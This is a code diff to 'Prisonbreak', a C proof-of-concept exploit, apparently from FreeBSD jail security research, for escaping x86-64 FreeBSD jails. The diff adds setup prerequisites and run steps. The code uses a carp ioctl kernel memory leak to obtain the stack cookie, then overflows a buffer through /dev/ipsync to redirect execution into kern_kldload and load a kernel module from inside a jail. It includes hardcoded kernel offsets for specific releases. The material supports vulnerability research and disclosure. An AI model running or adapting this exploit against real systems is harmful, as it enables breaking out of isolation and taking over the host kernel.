@@ -1,3 +1,44 @@
+/*
+Prisonbreak
+-----------
+Proof of concept jail escape exploit for x86-64 FreeBSD by Ilja van Sprundel and Michael Smith.
+
+https://github.com/iljavs/FreeBSD-Jail-Security-Research
+
+TODO: Moar disclaimer / license info?
+
+Prerequisites
+-------------
+1. Host must have carp kernel module loaded
+
+sysrc kld_list+="carp"
+kldload carp
+
+2. Host must have ipfilter kernel module loaded
+
+sysrc kld_list+="ipfilter"
+kldload ipfilter
+
+
+3. ipfilter device /dev/ipsync must be visible in jail
+
+cat << 'EOF' > /etc/devfs.rules
+[devfsrules_ipf=5]
+add path ipsync    unhide
+EOF
+
+service devfs restart
+service jail restart prisonbreak
+
+How to run
+----------
+1. Copy the poc/prisonbreak-1 directory over to a supported FreeBSD jail with root access
+2. Build the prisonbreak kernel module: cd module && make && cp prisonbreak.ko ../ && cd ..
+3. Build the prisobreak exploit: make
+4. Run the prisonbreak exploit shell script: ./exploit.sh
+5. Profit (of all the knowledge you have gained, not financially)
+*/
+
 #include <arpa/inet.h>
 #include <err.h>
 #include <errno.h>
@@ -24,11 +65,6 @@
 #define NUM_CARP_IFS 12
 #define IF_NAME "epair100b"
 
-#define DEBUG_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0
-#define PRODUCTION_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0 - 1000
-
-#define DEBUG_KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0
-#define PRODUCTION_KERN_KLDLOAD_ADDRESS 0xffffffff80b3db70
 // prisonbreak() configuration
 #define USER_MAPPED_MEMORY_ADDRESS 0x0000414141410000ULL
 
@@ -95,32 +131,7 @@ static const struct kernel_offsets koffsets[] = {
         .kern_kldload_address = 0xffffffff80af7af0,
     }};
 
-/*
-Prerequisites
--------------
-1. Host must have carp kernel module loaded
-
-sysrc kld_list+="carp"
-kldload carp
-
-2. Host must have ipfilter kernel module loaded
-
-sysrc kld_list+="ipfilter"
-kldload ipfilter
-
-
-3. ipfilter device /dev/ipsync must be visible in jail
-
-cat << 'EOF' > /etc/devfs.rules
-[devfsrules_ipf=5]
-add path ipsync    unhide
-EOF
-
-service devfs restart
-service jail restart prisonbreak
-*/
-
-void cyclic(char* buf, size_t len) {
+void cyclic_pattern(char* buf, size_t len) {
   const char set1[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
   const char set2[] = "abcdefghijklmnopqrstuvwxyz";
   const char set3[] = "0123456789";
@@ -191,7 +202,7 @@ unsigned long get_pargs() {
 }
 
 unsigned int get_platform_idx() {
-  // Get the kernel config name (e.g. GENERIC, GENERIC-DEBUG, ...)
+  // Get kernel config name (e.g. GENERIC, GENERIC-DEBUG, ...)
   char kern_ident[256];
   size_t kern_ident_len = sizeof(kern_ident);
 
@@ -199,20 +210,20 @@ unsigned int get_platform_idx() {
     return PLATFORM_UNKNOWN;
   }
 
-  // Get the release (e.g. 14.3-RELEASE, 15.0-RELEASE, ...) via POSIX uname(2)
+  // Get release (e.g. 14.3-RELEASE, 15.0-RELEASE, ...) via POSIX uname(2)
   struct utsname u;
   if (uname(&u) == -1) {
     return PLATFORM_UNKNOWN;
   }
 
-  /* FreeBSD 14.3 GENERIC-DEBUG*/
+  /* FreeBSD 14.3 GENERIC-DEBUG */
   if (strcmp(u.release, "14.3-RELEASE") == 0) {
     if (strcmp(kern_ident, "GENERIC-DEBUG") == 0) return FBSD_14_DEBUG;
 
     return PLATFORM_UNKNOWN;
   }
 
-  /* FreeBSD 15.0 GENERIC*/
+  /* FreeBSD 15.0 GENERIC */
   if (strcmp(u.release, "15.0-RELEASE") == 0) {
     if (strcmp(kern_ident, "GENERIC") == 0) return FBSD_15_GENERIC;
 
@@ -228,14 +239,13 @@ void write_uint64(char* ptr, unsigned int offset, uint64_t value) {
   *u64dest = value;
 }
 
+/*
+ *
+ * 1. Get the stack cookie through a kernel memory leak bug
+ *
+ * See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
+ */
 uint64_t get_stack_cookie() {
-  /*
-   *
-   * 1. Get the stack cookie through a kernel memory leak bug
-   *
-   * See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
-   */
-
   int sock;
   struct carpreq carpr_set;
   struct carpreq carpr_get[NUM_CARP_IFS];
@@ -269,8 +279,7 @@ uint64_t get_stack_cookie() {
   //
   // NOTE(m): Defining multiple carp interfaces on one physical interface does
   // not seem possible using `ifconfig(8)`, either by design or because of a
-  // subtle locking bug (see
-  // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
+  // subtle locking bug (see https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
   for (int i = 1; i < NUM_CARP_IFS + 1; i++) {
     carpr_set.carpr_vhid = i;
     if (ioctl(sock, SIOCSVH, (caddr_t)&ifr_set) == -1) {
@@ -297,15 +306,14 @@ uint64_t get_stack_cookie() {
   return stack_cookie;
 }
 
+/*
+ *
+ * 2. Use the retrieved stack cookie in a classic stack smash attack
+ *
+ * https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/13
+ */
 void* prisonbreak(void* arg) {
   uint64_t stack_cookie = get_stack_cookie();
-
-  /*
-   *
-   * 2. Use the retrieved stack cookie in a stack smash attack
-   *
-   * https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/13
-   */
 
   int fd = open("/dev/ipsync", O_RDWR);
 
@@ -331,57 +339,31 @@ void* prisonbreak(void* arg) {
 
   // Fill the buffer with some easily recognizable bogus data (ASCII 'A')
   // memset(header, 0x41, len);
-
-  // Fill the buffer with cyclic data to make it easy to calculate offsets
-  cyclic((char*)header, len);
+  // or fill the buffer with cyclic data to make it easy to calculate offsets
+  cyclic_pattern((char*)header, len);
 
   // Restore the stack cookie at the location we know it should go, using the
   // value extracted earlier to please the stack protection checker 2048 + 32 =
   // 2080 (start of our overflow) + 752 bytes = 2832
   // i.e., use the badge we got off that guard.
-  //  int stack_cookie_offset = 2832;
-  //  unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
-  //  *ptr = stack_cookie;
   write_uint64((char*)header, ko.stack_cookie_offset, stack_cookie);
 
   // Overwrite the address where kern_kldload is going to read the td argument
-  //  int td_offset = 2872;
-  // int td_offset = 2872 - 24;
-  //  ptr = (unsigned long*)((char*)header + td_offset);
-  //  *ptr = get_td();
   write_uint64((char*)header, ko.td_offset, get_td());
 
   // Overwrite the address where kern_kldload is going to read the string
   // containing our custom kernel module path
-  //  int kernel_module_path_offset = 2864;
-  // int kernel_module_path_offset = 2864 + 8;
-  //  ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
-  //  *ptr = get_pargs();
   write_uint64((char*)header, ko.kernel_module_path_offset, get_pargs());
 
   // Overwrite the address where kern_kldload is going to read the fileid
-  //  int fileid_offset = 2840;
-  // int fileid_offset = 2840 + 23;
-  //  ptr = (unsigned long*)((char*)header + fileid_offset);
-  //  *ptr = 0;
   write_uint64((char*)header, ko.fileid_offset, 0);
 
   // Restore $rbp
-  //  int rbp_offset = 2880;
-  //  ptr = (unsigned long*)((char*)header + rbp_offset);
-  //  *ptr = DEBUG_RESTORED_RBP_ADDRESS;
   write_uint64((char*)header, ko.base_pointer_offset, ko.restored_ebp_address);
 
-  // Overwrite the return address to jump into something we can use, e.g.
-  // `kern_kldload()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
-  // = 2888
-  //  int return_address_offset = 2888;
-  //  ptr = (unsigned long*)((char*)header + return_address_offset);
-  //  unsigned long kern_kldload = DEBUG_KERN_KLDLOAD_ADDRESS;
+  // Overwrite the return address to jump into something we can use, e.g. `kern_kldload()`.
   // NOTE: We jump 69 bytes *into* kern_kldload to bypass some checks, i.e.
   // making sure none of the guards spot us.
-  //  unsigned long jump_to_address = kern_kldload + 69;
-  //  *ptr = jump_to_address;
   write_uint64((char*)header, ko.instruction_pointer_offset, ko.kern_kldload_address + 69);
 
   // Populate the header with expected values so we pass all the checks and get
@@ -438,7 +420,7 @@ void dispatch_messages() {
     while (msg->entry_ready == 0);
 
     if (msg->entry_ready == 2) {
-      printf("Final message received. Exploit done.\n");
+      printf("Final message received. Exploit done. You've probably made it out of prison.\n");
 
       return;
     }
